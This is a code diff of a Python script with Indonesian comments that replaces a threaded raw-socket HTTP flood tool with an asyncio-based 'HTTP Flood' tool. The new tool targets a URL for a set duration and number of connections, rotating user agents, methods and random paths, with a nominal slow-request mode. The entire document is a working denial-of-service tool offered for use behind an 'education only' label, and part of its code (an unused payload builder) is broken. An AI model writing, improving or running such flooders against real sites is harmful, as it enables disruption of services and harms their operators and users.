@@ -1,167 +1,155 @@
-try:
-    import socket
-    import threading
-    import string
-    import random
-    import time
-    import os
-    import platform
-    import sys
-    import select
-    from colorama import Fore
-except ModuleNotFoundError as e:
-    print(f"{e} CAN'T IMPORT . . . . ")
-    exit()
+```python
+import asyncio
+import aiohttp
+import random
+import string
+import time
+import argparse
+import logging
+import sys
+import socket
+from urllib.parse import urlparse
+from tqdm import tqdm
 
-stop_attack = threading.Event()
+# Atur logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Clear screen
-def clear_text():
-    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')
+# Daftar User-Agent acak
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1'
+]
 
-# Generate random URL path
-def generate_url_path_pyflooder(num):
-    msg = str(string.ascii_letters + string.digits + string.punctuation)
-    return "".join(random.sample(msg, int(num)))
+# Daftar metode HTTP
+HTTP_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS']
 
-def generate_url_path_choice(num):
-    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
-    return ''.join(random.choice(letter) for _ in range(int(num)))
+# Buat path URL acak
+def generate_url_path(length):
+    chars = string.ascii_letters + string.digits + string.punctuation
+    return ''.join(random.choice(chars) for _ in range(length))
 
-# Attack logic
-def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet):
-    if stop_attack.is_set():
-        return
-    url_path = generate_url_path_pyflooder(5) if random.choice(['PY_FLOOD', 'CHOICES_FLOOD']) == "PY_FLOOD" else generate_url_path_choice(5)
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Buat parameter query acak
+def generate_query_params():
+    params = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
+    return f'?q={params}'
+
+# Buat payload
+def generate_payload(method, host, path, slow=False):
+    headers = {
+        'Host': host,
+        'User-Agent': random.choice(USER_AGENTS),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Content-Length': str(random.randint(100, 1000)) if method == 'POST' else '0',
+        'X-Custom-Header': ''.join(random.choice(string.ascii_letters) for _ in range(50))  # Header kustom besar
+    }
+    path = f'/{path}{generate_query_params()}'
+    payload = f'{method} {path} HTTP/1.1\r\n'
+    for key, value in headers.items():
+        payload += f'{key}: {value}\r\n'
+    if slow and method == 'POST':
+        payload += '\r\n' + 'A' * 50  # Data POST parsial buat serangan lambat
+    else:
+        payload += '\r\n'
+    return payload
+
+# Kirim satu request
+async def send_request(session, url, method, host, path, slow=False):
     try:
-        payload_patterns = {
-            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n",
-            'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r",
-            'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n",
-            'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n",
-            'OWN4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n",
-            'OWN5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r",
-            'OWN6': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n",
-            'OWN7': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r",
-            'OWN8': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r",
-            'TEST': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n",
-            'TEST2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n",
-            'TEST3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n",
-            'TEST4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r",
-            'TEST5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r",
-        }
-        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
-        s.connect((ip, port))
-        for _ in range(booter_sent):
-            if stop_attack.is_set():
-                break
-            s.sendall(packet_data)
-    except:
-        pass
-    finally:
-        s.close()
+        async with session.request(
+            method=method,
+            url=url + path + generate_query_params(),
+            headers={
+                'Host': host,
+                'User-Agent': random.choice(USER_AGENTS),
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive'
+            },
+            timeout=aiohttp.ClientTimeout(total=5)
+        ) as response:
+            logging.info(f'Kirim request {method} ke {url}{path}, status: {response.status}')
+    except Exception as e:
+        logging.error(f'Gagal kirim request: {e}')
 
-def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet):
-    while time.time() < time_loader and not stop_attack.is_set():
-        for _ in range(min(spam_loader, 10)):
-            if stop_attack.is_set():
-                break
-            th = threading.Thread(target=DoS_Attack, args=(ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet))
-            th.start()
-            th.join()
+# Loop serangan utama
+async def run_attack(url, host, duration, connections, slow_ratio=0.1):
+    timeout = aiohttp.ClientTimeout(total=10)
+    connector = aiohttp.TCPConnector(limit=connections, force_close=True)
+    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
+        end_time = time.time() + duration
+        tasks = []
+        with tqdm(total=duration, desc="Progres Serangan", unit="s") as pbar:
+            while time.time() < end_time:
+                for _ in range(connections):
+                    method = random.choice(HTTP_METHODS)
+                    path = generate_url_path(random.randint(5, 10))
+                    # Campur serangan lambat dan cepat
+                    slow = random.random() < slow_ratio
+                    task = asyncio.create_task(send_request(session, url, method, host, path, slow))
+                    tasks.append(task)
+                    if slow:
+                        await asyncio.sleep(random.uniform(0.1, 0.5))  # Jeda buat serangan lambat
+                await asyncio.gather(*tasks, return_exceptions=True)
+                tasks.clear()
+                pbar.update(1)
+                await asyncio.sleep(1)
 
-# Countdown + interrupt
-def countdown_timer(time_loader):
-    remaining = int(time_loader - time.time())
-    while remaining > 0 and not stop_attack.is_set():
-        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
-        sys.stdout.flush()
-
-        # Cek jika ENTER ditekan
-        if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
-            _ = sys.stdin.readline()
-            stop_attack.set()
-            print(f"\n{Fore.RED}Serangan Dihentikan{Fore.RESET}")
-            return
-
-        time.sleep(1)
-        remaining = int(time_loader - time.time())
-
-    if not stop_attack.is_set():
-        print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
-        stop_attack.set()
-
-# Exit confirm
-def confirm_exit():
-    while True:
-        choice = input(f"{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}").lower()
-        if choice == 'y':
-            print(f"{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
-            sys.exit(0)
-        elif choice == 'n':
-            print()
-            return
-
-# MAIN COMMAND LOOP
-def command():
-    global stop_attack
-    while True:
-        try:
-            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
-            if not data_input_loader:
-                confirm_exit()
-                continue
-
-            args_get = data_input_loader.split(" ")
-            if args_get[0].lower() == "clear":
-                clear_text()
-            elif args_get[0].upper() == "!FLOOD":
-                if len(args_get) == 10:
-                    data_type_loader_packet = args_get[1].upper()
-                    target_loader = args_get[2]
-                    port_loader = int(args_get[3])
-                    time_loader = time.time() + int(args_get[4])
-                    spam_loader = int(args_get[5])
-                    create_thread = min(int(args_get[6]), 10)
-                    booter_sent = int(args_get[7])
-                    methods_loader = args_get[8]
-                    spam_create_thread = min(int(args_get[9]), 10)
-
-                    host = ''
-                    ip = ''
-                    try:
-                        host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
-                        if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
-                            print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
-                            continue
-                        ip = socket.gethostbyname(host)
-                    except socket.gaierror:
-                        print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
-                        continue
-
-                    stop_attack.clear()
-                    print(f"{Fore.LIGHTCYAN_EX}Serangan Dimulai\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}{Fore.RESET}")
-
-                    for _ in range(create_thread):
-                        for _ in range(spam_create_thread):
-                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet)).start()
-
-                    countdown_timer(time_loader)
-                    continue
-                else:
-                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
-            else:
-                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
-        except KeyboardInterrupt:
-            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
-            stop_attack.set()
-            sys.exit(0)
-
-if __name__ == "__main__":
+# Resolve hostname ke IP
+def resolve_host(host):
     try:
-        command()
+        ip = socket.gethostbyname(host)
+        logging.info(f'Resolve {host} ke {ip}')
+        return ip
+    except socket.gaierror:
+        logging.error(f'Gagal resolve host {host}')
+        return None
+
+# Fungsi utama
+def main():
+    parser = argparse.ArgumentParser(description='Alat HTTP Flood yang Ditingkatkan (Hanya untuk Edukasi)')
+    parser.add_argument('--target', required=True, help='URL target (misal, http://example.com)')
+    parser.add_argument('--port', type=int, default=80, help='Port target (default: 80)')
+    parser.add_argument('--duration', type=int, default=60, help='Durasi serangan dalam detik')
+    parser.add_argument('--connections', type=int, default=100, help='Jumlah koneksi bersamaan')
+    parser.add_argument('--slow-ratio', type=float, default=0.1, help='Rasio request lambat (0 sampai 1)')
+
+    args = parser.parse_args()
+
+    # Validasi target
+    parsed_url = urlparse(args.target)
+    host = parsed_url.hostname
+    if not host:
+        logging.error('URL target tidak valid')
+        sys.exit(1)
+
+    # Cek domain terlarang
+    restricted = ['.gov', '.mil', '.edu', '.ac']
+    if any(ext in host for ext in restricted):
+        logging.error(f'Tidak bisa nyerang domain terlarang: {restricted}')
+        sys.exit(1)
+
+    # Resolve IP
+    ip = resolve_host(host)
+    if not ip:
+        sys.exit(1)
+
+    # Atur protokol
+    protocol = 'https' if args.port == 443 else 'http'
+    url = f'{protocol}://{host}:{args.port}'
+
+    # Jalankan serangan
+    logging.info(f'Mulai serangan ke {url} selama {args.duration} detik dengan {args.connections} koneksi')
+    try:
+        asyncio.run(run_attack(url, host, args.duration, args.connections, args.slow_ratio))
+        logging.info('Serangan selesai')
     except KeyboardInterrupt:
-        print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
-        stop_attack.set()
+        logging.info('Serangan dihentikan oleh pengguna')
         sys.exit(0)
+
+if __name__ == '__main__':
+    main()
+```
